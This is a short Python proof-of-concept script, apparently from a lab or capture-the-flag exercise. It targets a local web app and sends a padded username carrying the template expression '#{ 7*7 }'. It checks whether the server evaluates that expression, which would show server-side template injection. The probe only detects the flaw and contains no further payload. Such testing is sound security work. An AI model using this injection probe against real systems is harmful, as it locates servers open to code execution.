#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"

if (
    "49"
    in requests.get(
        URL,
        params={
            "username": "A" * 32 + "#{ 7*7 }",
        },
    ).text
):
    print("SSTI with BOF: success")
